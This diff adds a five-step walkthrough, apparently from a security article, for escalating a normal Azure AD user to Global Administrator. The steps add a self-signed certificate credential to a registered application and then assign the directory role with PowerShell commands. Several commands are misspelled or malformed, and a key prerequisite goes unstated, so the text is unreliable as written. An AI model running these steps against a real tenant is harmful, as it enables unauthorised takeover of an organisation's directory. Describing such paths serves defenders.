@@ -1,0 +1,20 @@
+▪ Step 1: The attacker discovers a normal user account in Azure AD using tools such as Bloodhound or AzureHound.
+
+▪ Step 2: The attacker runs the following command to set up the Azure AD PowerShell module and login to the Azure AD using a normal user account: Connect -AzureAD
+
+▪ Step 3: The attacker executes the following commands to create a new key credential for the application and store it in the local machine.
+$pwd = <password>
+$path = <thumbprint>
+Export-PfxCertificate -cert $path -FilePath <path_to_save_.pfx file> -Passsword $pwd
+
+▪ Step 4: The attacker uploads that self-signed certificate into the Azure AD in the certificate portion of the registered application
+
+▪ Step 5: Now, the attacker runs the following commands to escalate privileges of the normal user account to Global Administrator after authenticating the Azure AD with the newly created certificate:
+Connect -AzureAD -TenentId <tenant_id> -ApplicationId <app_id> - CertificateThumbPrint <thumbprint>
+Add-AzureADDirectoryRoleMember -RefObjectId <normaluser_object ID> -ObjectId <Globaladmin_ID>
+
+
+
+
+
+
